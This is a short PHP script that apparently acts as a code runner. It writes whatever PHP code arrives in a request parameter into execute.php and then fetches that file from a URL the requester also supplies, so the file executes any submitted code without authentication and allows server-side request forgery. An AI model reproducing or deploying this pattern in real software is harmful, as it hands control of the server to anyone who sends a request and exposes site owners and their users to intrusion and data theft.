<?php
    // if(isset($_GET['code']))
    // {
    //     echo $_GET['code'];
    // }
    
    $url = $_REQUEST['location'] ?? 'url';
    // print_r($_REQUEST);
    
    $code = empty($_REQUEST['code']) ? "echo 'No code found';" : $_REQUEST['code'];

    $code = json_decode($code);
    file_put_contents(__DIR__.'\execute.php', "<?php $code");

    $result = file_get_contents("$url/execute.php");

    print_r($result);
// ?>